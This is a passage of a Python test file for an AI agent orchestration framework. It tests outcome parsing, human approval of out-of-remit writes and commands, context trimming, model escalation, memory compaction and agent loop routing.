    from trance.agents.runner import AgentTurn

    assert AgentTurn(text="OUTCOME: the feature is not complete").outcome[0] == "UNCLEAR"
    assert AgentTurn(text="OUTCOME: nothing was done successfully").outcome[0] == "UNCLEAR"


def test_an_unreadable_outcome_is_asked_again_and_then_accepted(tmp_path, monkeypatch):
    from trance.providers.base import ChatResponse

    replies = [
        ChatResponse(text="Verified the file.\n\nOUTCOME: Verified index.html is "
                          "complete and correct — no changes needed."),
        ChatResponse(text="OUTCOME: SUCCESS"),
    ]
    turn, prompts = _turn_with(monkeypatch, replies, project=tmp_path)

    assert any("did not say SUCCESS or FAILED" in p for p in prompts)
    assert turn.outcome[0] == "SUCCESS"


def test_an_outcome_that_stays_unreadable_fails_with_that_as_the_reason(tmp_path, monkeypatch):
    """Fail closed — a result nobody can read is not evidence of success — but
    do not present the agent's prose as if it were a failure reason."""
    from trance.providers.base import ChatResponse

    replies = [ChatResponse(text="OUTCOME: Verified and looking good"),
               ChatResponse(text="It all looks fine to me, honestly.")]
    turn, prompts = _turn_with(monkeypatch, replies, project=tmp_path)

    state, reason = turn.outcome
    assert state == "FAILED"
    assert "asked twice" in reason and "no readable result" in reason
    assert "looking good" not in reason


def test_the_re_ask_says_that_no_changes_needed_is_success(tmp_path, monkeypatch):
    """The observed case: the agent found the work already correct and had no
    word for it."""
    from trance.providers.base import ChatResponse

    _turn_with(monkeypatch, [ChatResponse(text="OUTCOME: already fine"),
                             ChatResponse(text="OUTCOME: SUCCESS")], project=tmp_path)


# ------------------------------ asking instead of refusing outright

def test_a_refused_write_asks_before_it_refuses(tmp_path):
    """The tester needed jest.config.js, nobody had given it one, and the
    refusal cost a whole step. A remit is a good default and a bad absolute."""
    import threading

    from trance.agents.approval import ONCE, ApprovalBroker

    broker = ApprovalBroker(on_request=lambda r: threading.Timer(
        0.01, broker.resolve, args=(r.id, ONCE)).start())
    tools = _tools_with_approval(tmp_path, "tester", broker)

    outcome = tools.call("write_file", {"path": "jest.config.js", "content": "module.exports={}"})
    assert outcome.ok is True
    assert (tmp_path / "jest.config.js").read_text() == "module.exports={}"
    assert outcome.remit_violation is None


def test_a_denied_write_still_refuses_exactly_as_before(tmp_path):
    import threading

    from trance.agents.approval import DENY, ApprovalBroker

    broker = ApprovalBroker(on_request=lambda r: threading.Timer(
        0.01, broker.resolve, args=(r.id, DENY)).start())
    tools = _tools_with_approval(tmp_path, "tester", broker)

    outcome = tools.call("write_file", {"path": "jest.config.js", "content": "x"})
    assert outcome.ok is False
    assert outcome.remit_violation == "jest.config.js"
    assert not (tmp_path / "jest.config.js").exists()


def test_a_refused_command_asks_too(tmp_path):
    import threading

    from trance.agents.approval import ONCE, ApprovalBroker

    asked = []
    broker = ApprovalBroker(on_request=lambda r: (asked.append(r), threading.Timer(
        0.01, broker.resolve, args=(r.id, ONCE)).start()))
    role = copy.deepcopy(BUILTIN_ROLES["tester"])
    role.commands = ["echo"]                       # npx is not on its list
    tools = _tools_with_approval(tmp_path, role, broker)

    outcome = tools.call("run_command", {"command": "npx --version"})
    assert asked and asked[0].kind == "command"
    assert "npx" in asked[0].detail["programs"]
    assert outcome.detail.get("kind") == "command"        # it actually ran


def test_no_answer_in_time_denies(tmp_path):
    """Blocking a worker on a human is only safe with a way out."""
    from trance.agents.approval import ApprovalBroker

    broker = ApprovalBroker(on_request=lambda r: None, timeout_s=0.05)
    tools = _tools_with_approval(tmp_path, "tester", broker)

    outcome = tools.call("write_file", {"path": "jest.config.js", "content": "x"})
    assert outcome.ok is False and outcome.remit_violation == "jest.config.js"


def test_stopping_releases_an_agent_waiting_on_an_answer(tmp_path):
    """Otherwise the engine cannot reach its own stop check."""
    import threading
    import time

    from trance.agents.approval import ApprovalBroker

    broker = ApprovalBroker(on_request=lambda r: None, timeout_s=30)
    tools = _tools_with_approval(tmp_path, "tester", broker)
    result = {}

    worker = threading.Thread(
        target=lambda: result.update(
            outcome=tools.call("write_file", {"path": "jest.config.js", "content": "x"})))
    worker.start()
    for _ in range(200):
        if broker.pending():
            break
        time.sleep(0.01)

    broker.abandon()
    worker.join(timeout=5)
    assert not worker.is_alive()                   # not stuck for 30s
    assert result["outcome"].ok is False


def test_asking_can_be_turned_off_entirely(tmp_path):
    """An unattended run wants the old behaviour, immediately."""
    from trance.agents.approval import ApprovalBroker

    asked = []
    broker = ApprovalBroker(on_request=lambda r: asked.append(r), enabled=False)
    tools = _tools_with_approval(tmp_path, "tester", broker)

    outcome = tools.call("write_file", {"path": "jest.config.js", "content": "x"})
    assert outcome.ok is False and asked == []


def test_always_writes_the_answer_into_the_policy(tmp_path):
    """"always" has to mean it — the same question must not come back next step."""
    import threading
    import time

    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [{"role": "tester", "task": "t"}]})
    client.post(f"/api/sessions/{sid}/start")
    app.state.store.get(sid).stop()

    broker = app.state.brokers[sid]
    answers = {}

    def ask():
        answers["request"] = broker.ask(
            kind="write", agent="tester", session_id=sid, step_id="st",
            subject="jest.config.js", detail={"remit": ["tests/**"]})

    worker = threading.Thread(target=ask)
    worker.start()
    for _ in range(200):
        if broker.pending():
            break
        time.sleep(0.01)

    pending = client.get(f"/api/sessions/{sid}/approvals").json()["pending"]
    assert [r["subject"] for r in pending] == ["jest.config.js"]

    body = client.post(f"/api/sessions/{sid}/approvals/{pending[0]['id']}",
                       json={"decision": "always"}).json()
    worker.join(timeout=5)

    assert body["widened"] is True
    assert answers["request"].allowed is True
    # The exact path, not a widened glob: the user allowed this file.
    tester = next(r for r in client.get("/api/agents").json()["agents"]
                  if r["name"] == "tester")
    assert "jest.config.js" in tester["paths"]


def test_an_unknown_approval_is_a_404_not_a_hang(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]

    gone = client.post(f"/api/sessions/{sid}/approvals/ap_nope", json={"decision": "once"})
    assert gone.status_code == 404 and "timed out" in gone.json()["detail"]
    bad = client.post(f"/api/sessions/{sid}/approvals/ap_1", json={"decision": "maybe"})
    assert bad.status_code == 400


# ------------------ chat habits leaking into a tool argument

def test_a_filename_header_is_stripped_before_the_file_is_written(tmp_path):
    """Regression: agents prefix files with `# server/app.js`, which in a .js
    file is a syntax error rather than a blemish."""
    tools = _tools(tmp_path)
    outcome = tools.call("write_file", {
        "path": "server/app.js", "content": "# server/app.js\nconst x = 1;\n"})

    assert (tmp_path / "server/app.js").read_text() == "const x = 1;\n"
    assert "removed" in outcome.text          # and the agent is told, so it learns
    assert outcome.detail["stripped"]


def test_a_code_fence_around_the_whole_file_is_unwrapped(tmp_path):
    tools = _tools(tmp_path)
    tools.call("write_file", {
        "path": "server/app.js", "content": "```javascript\nconst x = 1;\n```"})
    assert (tmp_path / "server/app.js").read_text() == "const x = 1;"


def test_stripping_never_touches_real_code():
    """Being wrong here silently deletes someone's first line."""
    from trance.agents.tools import strip_wrappers

    for text, rel in [
        ("#!/usr/bin/env python3\nprint(1)\n", "run.py"),        # a shebang
        ("# Copyright 2026 Acme\nprint(1)\n", "run.py"),         # a real comment
        ("# server/other.js\nconst x = 1;\n", "server/app.js"),  # a different file
        ("const x = 1;\n", "app.js"),
        ("// eslint-disable-next-line\nconst x = 1;\n", "app.js"),
    ]:
        assert strip_wrappers(text, rel) == (text, []), rel


def test_a_markdown_file_keeps_its_fences(tmp_path):
    """A fence in a README is content, not a wrapper."""
    tools = _tools(tmp_path, "devops")
    body = "```bash\nnpm test\n```"
    tools.call("write_file", {"path": "README.md", "content": body})
    assert (tmp_path / "README.md").read_text() == body


# ---------------------------------- one last try on a stronger model

def _escalating_engine(tmp_path, team, preset="big"):
    from trance.providers.base import ModelPreset, ProviderConfig

    engine = _engine(tmp_path, team)
    engine.config.providers["p"] = ProviderConfig(name="p", kind="llamacpp")
    # The everyday model comes first: an agent naming none uses the first
    # defined model, and the escalation model is not that.
    engine.config.presets["normal"] = ModelPreset(name="normal", kind="llamacpp",
                                                  model="small-model")
    engine.config.presets[preset] = ModelPreset(name=preset, kind="llamacpp",
                                                model="big-model")
    engine.config.escalation_preset = preset
    return engine


def test_an_exhausted_block_gets_one_try_on_the_stronger_model(tmp_path, monkeypatch):
    """Regression: 16 attempts on the same model, all failing the same way. The
    loop varies the prompt and the fixer; it never varies the model."""
    from trance.flow import Step

    engine = _escalating_engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="fix the socket handling", max_loops=2)
    models = []

    def fake(**kw):
        models.append(kw["config"].model)
        succeed = kw["config"].model == "big-model"
        return _Turn("PASS", "done" if succeed else "still broken",
                     outcome=("SUCCESS", "") if succeed else ("FAILED", "socket hangs"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert models[-1] == "big-model"
    assert step.status == "done"
    assert step.escalated is True
    assert engine.session.status != "error"      # the run was not halted


def test_the_escalated_attempt_is_shown_every_earlier_failure(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _escalating_engine(tmp_path, ["backend"])
    step = Step(role="backend", task="fix the socket handling", max_loops=2)
    tasks = []

    def fake(**kw):
        tasks.append(kw["task"])
        big = kw["config"].model == "big-model"
        return _Turn(None, "x", outcome=("SUCCESS", "") if big else ("FAILED", "socket hangs"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    brief = tasks[-1]
    assert "already failed 2 times" in brief
    assert "socket hangs" in brief
    assert "Do not repeat the approach that failed" in brief


def test_escalation_happens_once_and_then_the_run_halts(tmp_path, monkeypatch):
    """Escalation that can loop is just a longer loop with a bigger bill."""
    from trance.flow import Step

    engine = _escalating_engine(tmp_path, ["backend"])
    step = Step(role="backend", task="fix it", max_loops=2)
    calls = []

    def fake(**kw):
        calls.append(kw["config"].model)
        return _Turn(None, "no", outcome=("FAILED", "still broken"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert calls.count("big-model") == 1
    assert step.status == "failed"
    assert engine.session.status == "error"


def test_without_an_escalation_model_nothing_changes(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])          # no escalation configured
    step = Step(role="backend", task="fix it", max_loops=2)
    calls = []

    def fake(**kw):
        calls.append(kw["config"].model)
        return _Turn(None, "no", outcome=("FAILED", "still broken"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert len(calls) == 2 and step.status == "failed"
    assert step.escalated is False


def test_compaction_never_rewrites_what_the_user_wrote(tmp_path):
    """A user note is an instruction, not an observation. Handing it to a model
    to "merge and shorten" is how a deliberate correction gets summarised away
    by the agents it was meant to correct."""
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    _fill(memory, 20)
    memory.note("user", "THE TEST SUITE PASSES — stop trying to fix a socket bug")
    memory.note("backend", "one more agent observation")

    seen = {}

    def rewrite(text):
        seen["text"] = text
        return "- **backend**: everything merged into one line"

    result = memory.compact(rewrite)
    assert result["compacted"] is True

    assert "THE TEST SUITE PASSES" not in seen["text"]      # never sent to the model
    notes = memory.notes()
    assert any("THE TEST SUITE PASSES" in n for n in notes)  # and still there
    assert notes[0].startswith("- **user**")                # kept, and leading


def test_a_memory_of_only_user_notes_is_left_alone(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    for i in range(30):
        memory.note("user", f"instruction {i} that the agents must follow exactly")

    result = memory.compact(lambda text: "- **backend**: nope")
    assert result["compacted"] is False
    assert len(memory.notes()) == 30


# ------------------------------- a lookup that found nothing is not a refusal

def test_a_graph_miss_is_not_reported_as_a_refusal(tmp_path):
    from trance.agents.tools import AgentTools

    """Regression: search_symbols misses rendered as "search_symbols refused",
    in red, next to writes that had actually been blocked."""
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    (tmp_path / "app.py").write_text("def charge(order):\n    return 1\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)
    tools = AgentTools(tmp_path, BUILTIN_ROLES["backend"], ContextTools(db, tmp_path),
                       notify=lambda *a, **k: None)

    miss = tools.call("search_symbols", {"pattern": "nothing_like_this"})
    assert miss.detail["kind"] == "graph"      # the UI keys off this, not off ok
    assert miss.detail["hit"] is False

    hit = tools.call("search_symbols", {"pattern": "charge"})
    assert hit.detail["hit"] is True and "charge" in hit.text


def test_a_phrase_search_explains_itself(tmp_path):
    """The model was passing test descriptions — "SSE done event equity curve"
    — and a bare "no symbols match" just invited another sentence."""
    from trance.worker.tools import _no_match

    message = _no_match("SSE done event equity curve")
    assert "not a full-text or semantic search" in message
    assert "'equity'" in message                  # a concrete next move
    assert "read_file" in message

    single = _no_match("streamBacktst")
    assert "full-text" not in single              # not the same advice
    assert "project map" in single


def test_the_tool_description_says_it_matches_names(tmp_path):
    from trance.worker.tools import specs

    search = next(s for s in specs() if s["function"]["name"] == "search_symbols")
    assert "not a text search" in search["function"]["description"]
    assert "no spaces" in (search["function"]["parameters"]["properties"]["pattern"]
                           ["description"])


# ------------------------- the biggest thing in the window is your own output

def test_a_file_already_written_stops_costing_context():
    """An agent that writes three 10KB files has 30KB of its own output pinned
    in the conversation forever — the assistant messages holding those calls are
    never trimmed, and the bytes are already on disk."""
    import json

    from trance.agents.runner import WRITTEN, shrink_written_files

    def write_call(path, size):
        return {"role": "assistant", "tool_calls": [{
            "id": "c", "function": {"name": "write_file", "arguments": json.dumps(
                {"path": path, "content": "x" * size})}}]}

    messages = [
        {"role": "user", "content": "task"},
        write_call("a.js", 10000),
        {"role": "tool", "content": "Created a.js"},
        write_call("b.js", 10000),
        {"role": "tool", "content": "Created b.js"},
        write_call("c.js", 10000),
    ]
    before = len(str(messages))
    shrunk = shrink_written_files(messages)

    assert shrunk == 2                       # the most recent one is left intact
    assert len(str(messages)) < before - 19000
    args = json.loads(messages[1]["tool_calls"][0]["function"]["arguments"])
    assert args["content"] == WRITTEN and args["path"] == "a.js"   # the path stays
    last = json.loads(messages[5]["tool_calls"][0]["function"]["arguments"])
    assert last["content"] == "x" * 10000


def test_written_files_are_given_up_before_tool_results():
    """A file on disk can be read back exactly; a command's output cannot."""
    import json

    from trance.agents.runner import WRITTEN, fit_context

    messages = [
        {"role": "system", "content": "sys"},
        {"role": "user", "content": "task"},
        {"role": "assistant", "tool_calls": [{"id": "c", "function": {
            "name": "write_file",
            "arguments": json.dumps({"path": "a.js", "content": "x" * 40000})}}]},
        {"role": "tool", "content": "the test output that matters"},
        {"role": "assistant", "tool_calls": [{"id": "d", "function": {
            "name": "write_file",
            "arguments": json.dumps({"path": "b.js", "content": "y" * 400})}}]},
    ]
    fitted, dropped = fit_context(messages, budget=2000)

    shrunk = json.loads(messages[2]["tool_calls"][0]["function"]["arguments"])
    assert shrunk["content"] == WRITTEN
    assert messages[3]["content"] == "the test output that matters"   # kept


def test_the_estimate_is_calibrated_against_the_endpoints_own_count(tmp_path, monkeypatch):
    """Trimming against a guess is how a "55k" prompt arrived as 61k and filled
    the window it was supposed to stay inside."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    sent = []

    class DenseCounter:
        """An endpoint whose tokenizer runs at 2 chars/token, not 3.5."""

        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kwargs):
            chars = sum(len(str(m.get("content") or "")) + len(str(m.get("tool_calls") or ""))
                        for m in messages)
            sent.append(chars)
            self.n += 1
            usage = {"prompt_tokens": chars // 2}
            if self.n < 3:
                return ChatResponse(text="", usage=usage, tool_calls=[ToolCall(
                    id=f"c{self.n}", name="read_file", arguments={"path": "big.txt"})])
            return ChatResponse(text="OUTCOME: SUCCESS", usage=usage)

    (tmp_path / "big.txt").write_text("z" * 20000)
    monkeypatch.setattr(runner, "client_for", lambda config: DenseCounter())
    runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                     config=ModelConfig(context_window=20000, max_tokens=4000),
                     bus=EventBus(), session_id="s", step_id="st")

    # Budget is 20000-4000-1000 = 15000 tokens; at the endpoint's real 2
    # chars/token that is 30000 chars. The last prompt must respect the real
    # ratio, not the 3.5 guess (which would have allowed 52500 chars).
    assert sent[-1] <= 30000 * 1.05


# ------------------------- the same lookup, over and over, in one turn

def _reader(monkeypatch, tmp_path, reads, final="OUTCOME: SUCCESS"):
    """Drive an agent that issues the given read_file calls, one per round."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    results = []

    class Repeater:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kwargs):
            results.append([m for m in messages if m.get("role") == "tool"])
            if self.n < len(reads):
                args = reads[self.n]
                self.n += 1
                return ChatResponse(text="", tool_calls=[
                    ToolCall(id=f"c{self.n}", name="read_file", arguments=args)])
            return ChatResponse(text=final)

    monkeypatch.setattr(runner, "client_for", lambda config: Repeater())
    turn = runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                            config=ModelConfig(), bus=EventBus(),
                            session_id="s", step_id="st")
    return turn, results


def test_re_reading_the_same_file_points_at_the_copy_already_in_context(tmp_path, monkeypatch):
    """Regression: the frontend agent read tests/integration.test.js five times
    in one minute — five copies of a 24KB page in a 64k window."""
    (tmp_path / "big.js").write_text("const x = 1;\n" * 2000)
    turn, rounds = _reader(monkeypatch, tmp_path, [{"path": "big.js"}] * 4)

    assert turn.deduped_lookups == 3          # the first read is the real one
    contents = [m["content"] for m in rounds[-1]]
    assert sum("const x = 1;" in c for c in contents) == 1
    assert sum("already ran this exact lookup" in c for c in contents) == 3


def test_a_file_that_changed_is_read_again_in_full(tmp_path, monkeypatch):
    """Pointing at a stale copy would be worse than the duplication."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    path = tmp_path / "server" / "app.py"
    path.parent.mkdir(parents=True)
    path.write_text("first version\n")

    class Rewriter:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kwargs):
            self.n += 1
            if self.n == 1:
                return ChatResponse(text="", tool_calls=[ToolCall(
                    id="c1", name="read_file", arguments={"path": "server/app.py"})])
            if self.n == 2:
                return ChatResponse(text="", tool_calls=[ToolCall(
                    id="c2", name="write_file",
                    arguments={"path": "server/app.py",
                               "content": "second version, much longer now\n"})])
            if self.n == 3:
                return ChatResponse(text="", tool_calls=[ToolCall(
                    id="c3", name="read_file", arguments={"path": "server/app.py"})])
            self.last = messages
            return ChatResponse(text="OUTCOME: SUCCESS")

    client = Rewriter()
    monkeypatch.setattr(runner, "client_for", lambda config: client)
    turn = runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                            config=ModelConfig(), bus=EventBus(),
                            session_id="s", step_id="st")

    assert turn.deduped_lookups == 0
    assert any("second version" in str(m.get("content")) for m in client.last)


def test_a_different_page_of_the_same_file_is_not_deduped(tmp_path, monkeypatch):
    (tmp_path / "big.js").write_text("\n".join(f"line {i}" for i in range(3000)))
    turn, rounds = _reader(monkeypatch, tmp_path,
                           [{"path": "big.js"}, {"path": "big.js", "start_line": 900}])

    assert turn.deduped_lookups == 0
    contents = " ".join(m["content"] for m in rounds[-1])
    assert "line 0" in contents and "line 900" in contents


def test_a_command_is_never_deduped(tmp_path, monkeypatch):
    """Running the suite twice is a different question, not a repeat."""
    from trance.agents.runner import _lookup_key
    from trance.agents.tools import ToolOutcome

    outcome = ToolOutcome("out", detail={"kind": "command"})
    assert _lookup_key("run_command", {"command": "npm test"}, outcome) is None
    assert _lookup_key("write_file", {"path": "a.js"}, outcome) is None
    assert _lookup_key("read_file", {"path": "a.js"}, outcome) is not None


def test_a_trimmed_result_may_be_fetched_again(tmp_path, monkeypatch):
    """Once its copy is gone from the window, re-reading is the right move."""
    from trance.agents.runner import TRIMMED

    assert "call the tool again" not in TRIMMED       # no longer an invitation
    assert "only fetch this again if you cannot proceed" in TRIMMED


# ------------------- large files answer with their shape, not their bulk

def _indexed_tools(tmp_path, role="frontend"):
    from trance.agents.tools import AgentTools
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)
    return AgentTools(tmp_path, BUILTIN_ROLES[role], ContextTools(db, tmp_path),
                      notify=lambda *a, **k: None)


def test_a_large_indexed_file_returns_an_outline(tmp_path):
    """A 10KB file is ~2,600 tokens; its outline is ~150, and the agent nearly
    always wanted one function out of it."""
    body = "import os\n\n" + "\n\n".join(
        f"def handler_{i}(request):\n" + "    pass\n" * 40 for i in range(12))
    (tmp_path / "app.py").write_text(body)
    assert len(body) > 4000

    outcome = _indexed_tools(tmp_path).call("read_file", {"path": "app.py"})

    assert outcome.detail["outline"] is True
    assert "handler_0" in outcome.text and "handler_11" in outcome.text
    assert "import os" in outcome.text            # the top of the file comes too
    assert "pass" not in outcome.text             # but not the bodies
    assert len(outcome.text) < len(body) // 4


def test_a_small_file_still_comes_back_whole(tmp_path):
    (tmp_path / "app.py").write_text("def charge(order):\n    return order.total\n")
    outcome = _indexed_tools(tmp_path).call("read_file", {"path": "app.py"})
    assert not outcome.detail.get("outline")
    assert "return order.total" in outcome.text


def test_a_file_with_nothing_indexed_comes_back_whole(tmp_path):
    """An outline of nothing would be worse than the file."""
    (tmp_path / "data.json").write_text('{"a": ' + '"x",' * 2000 + '"b": 1}')
    outcome = _indexed_tools(tmp_path).call("read_file", {"path": "data.json"})
    assert not outcome.detail.get("outline")


def test_full_true_is_the_way_to_rewrite_a_file(tmp_path):
    """An agent about to rewrite a file genuinely needs every line of it."""
    body = "import os\n\n" + "\n\n".join(
        f"def handler_{i}(request):\n" + "    pass\n" * 40 for i in range(12))
    (tmp_path / "app.py").write_text(body)
    tools = _indexed_tools(tmp_path)

    assert tools.call("read_file", {"path": "app.py"}).detail["outline"] is True
    whole = tools.call("read_file", {"path": "app.py", "full": True})
    assert not whole.detail.get("outline")
    assert whole.text.count("def handler_") == 12


def test_paging_past_line_one_is_never_an_outline(tmp_path):
    body = "import os\n\n" + "\n\n".join(
        f"def handler_{i}(request):\n" + "    pass\n" * 40 for i in range(12))
    (tmp_path / "app.py").write_text(body)

    page = _indexed_tools(tmp_path).call("read_file", {"path": "app.py", "start_line": 200})
    assert not page.detail.get("outline")
    assert "pass" in page.text


def test_an_agent_without_the_graph_reads_whole_files(tmp_path):
    """The outline comes from the index; with no index there is nothing to
    offer instead."""
    body = "def a():\n" + "    pass\n" * 900
    (tmp_path / "app.py").write_text(body)
    tools = _tools(tmp_path)                       # no graph tools attached
    assert not tools.call("read_file", {"path": "app.py"}).detail.get("outline")


# ============================== loops: a reusable block of agents

def _loop_engine(tmp_path, team, loop):
    from trance.agents.store import LoopStore

    engine = _engine(tmp_path, team)
    store = LoopStore(tmp_path / "loops.json", seed=False)
    store.upsert(loop)
    engine.loops = store
    return engine


def _tf_loop(**kw):
    """tester → (fail) → backend → (success) → tester, exit when tests pass."""
    from trance.loops import (
        CHECK_FAILED, EXIT_LOOP, FAILED, FAIL_LOOP, SUCCESS, Edge, Loop, LoopNode)

    test = LoopNode(id="n_test", role="tester", focus="run the tests",
                    on={SUCCESS: Edge(EXIT_LOOP), FAILED: Edge("n_fix", max_visits=3)})
    fix = LoopNode(id="n_fix", role="backend", focus="fix the code under test",
                   on={SUCCESS: Edge("n_test", max_visits=3), FAILED: Edge(FAIL_LOOP)})
    return Loop(name="test-and-fix", nodes=[test, fix], start="n_test", **kw)


def test_a_loop_walks_from_agent_to_agent_by_outcome(tmp_path, monkeypatch):
    """The shape people build by hand: tester finds a bug, developer fixes it,
    tester runs again."""
    from trance.flow import Step

    engine = _loop_engine(tmp_path, ["tester", "backend"], _tf_loop())
    step = Step(role="", loop="test-and-fix", task="make the paddle bounce")
    order = []

    def fake(**kw):
        name = kw["role"].name
        order.append(name)
        # The tester fails once, the developer fixes, then the tester passes.
        failing = name == "tester" and order.count("tester") == 1
        return _Turn(None, "x", outcome=("FAILED", "ball passes through") if failing
                     else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert order == ["tester", "backend", "tester"]
    assert step.status == "done"


def test_each_agent_in_a_loop_gets_the_step_task_and_its_own_focus(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _loop_engine(tmp_path, ["tester", "backend"],
                          _tf_loop(prompt="This block ends when the tests pass."))
    engine.session.goal = "A crypto backtester."
    step = Step(role="", loop="test-and-fix", task="make the paddle bounce")
    seen = {}

    def fake(**kw):
        seen[kw["role"].name] = (kw["task"], kw.get("goal", ""))
        return _Turn(None, "x", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    task, goal = seen["tester"]
    assert "make the paddle bounce" in task        # the step's prompt
    assert "run the tests" in task                 # and this agent's part in it
    assert "A crypto backtester." in goal          # the project
    assert "ends when the tests pass" in goal      # and what the loop is for


def test_a_loop_that_will_not_converge_stops(tmp_path, monkeypatch):
    """max_visits on an edge is what makes a loop finite."""
    from trance.flow import Step

    engine = _loop_engine(tmp_path, ["tester", "backend"], _tf_loop())
    step = Step(role="", loop="test-and-fix", task="t")
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        # Nothing ever gets fixed: the tester always fails, the fixer always
        # claims success, and the pair would run forever.
        return _Turn(None, "x", outcome=("FAILED", "still broken")
                     if kw["role"].name == "tester" else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert step.status == "failed"
    assert engine.session.status == "error"        # it halts rather than moving on
    assert 4 <= len(order) <= 10                   # bounded, not forever
    assert any(e.type == "loop_exhausted" for e in engine.bus.history(engine.session.id))


def test_an_unrouted_outcome_ends_the_loop_rather_than_guessing(tmp_path, monkeypatch):
    """A missing exit means the author did not think about it, which is not a
    reason to invent a destination."""
    from trance.flow import Step
    from trance.loops import EXIT_LOOP, SUCCESS, Edge, Loop, LoopNode

    lonely = Loop(name="one-shot", nodes=[LoopNode(
        id="n1", role="backend", on={SUCCESS: Edge(EXIT_LOOP)})])
    engine = _loop_engine(tmp_path, ["backend"], lonely)
    step = Step(role="", loop="one-shot", task="t")

    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "x", outcome=("FAILED", "nope")))
    engine._execute(step)
    assert step.status == "failed"


def test_a_failed_check_routes_differently_from_a_failed_outcome(tmp_path, monkeypatch):
    """Three exits, not two: the agent said it worked and the checker disagreed
    is a different situation from the agent saying it failed."""
    from trance.flow import Step
    from trance.loops import CHECK_FAILED, EXIT_LOOP, FAILED, FAIL_LOOP, SUCCESS, Edge, Loop, LoopNode

    loop = Loop(name="checked", start="n1", nodes=[
        LoopNode(id="n1", role="backend", check="factchecker",
                 on={SUCCESS: Edge(EXIT_LOOP), FAILED: Edge(FAIL_LOOP),
                     CHECK_FAILED: Edge("n2", max_visits=2)}),
        LoopNode(id="n2", role="reviewer", on={SUCCESS: Edge(EXIT_LOOP),
                                               FAILED: Edge(FAIL_LOOP)}),
    ])
    engine = _loop_engine(tmp_path, ["backend", "factchecker", "reviewer"], loop)
    step = Step(role="", loop="checked", task="t")
    order = []

    def fake(**kw):
        name = kw["role"].name
        order.append(name)
        if name == "factchecker":
            return _Turn("FAIL", "the file is empty")
        return _Turn(None, "x", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert order[:2] == ["backend", "factchecker"]
    assert "reviewer" in order            # CHECK_FAILED took its own route
    assert step.status == "done"


def test_an_unknown_loop_halts_instead_of_running_nothing(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _loop_engine(tmp_path, ["backend"], _tf_loop())
    step = Step(role="", loop="does-not-exist", task="t")
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "x", outcome=("SUCCESS", "")))

    engine._execute(step)
    assert step.status == "failed" and "unknown loop" in step.summary


def test_a_loop_is_validated_before_it_can_be_saved():
    """A loop that dead-ends is otherwise discovered halfway through a run,
    with the work already done."""
    from trance.loops import EXIT_LOOP, FAILED, SUCCESS, CHECK_FAILED, Edge, Loop, LoopNode, validate

    roles = {"tester", "backend", "factchecker"}
    verifiers = {"factchecker"}

    ok = Loop(name="fine", nodes=[LoopNode(id="a", role="tester",
                                           on={SUCCESS: Edge(EXIT_LOOP)})])
    assert validate(ok, roles, verifiers) is None

    assert "at least one agent" in validate(Loop(name="empty"), roles, verifiers)
    assert "no spaces" in validate(Loop(name="two words", nodes=ok.nodes), roles, verifiers)

    unknown = Loop(name="x", nodes=[LoopNode(id="a", role="nobody",
                                             on={SUCCESS: Edge(EXIT_LOOP)})])
    assert "unknown agent" in validate(unknown, roles, verifiers)

    dangling = Loop(name="x", nodes=[LoopNode(id="a", role="tester",
                                              on={SUCCESS: Edge(EXIT_LOOP),
                                                  FAILED: Edge("gone")})])
    assert "points nowhere" in validate(dangling, roles, verifiers)

    no_exit = Loop(name="x", nodes=[LoopNode(id="a", role="tester",
                                             on={SUCCESS: Edge("a")})])
    assert "exits successfully" in validate(no_exit, roles, verifiers)

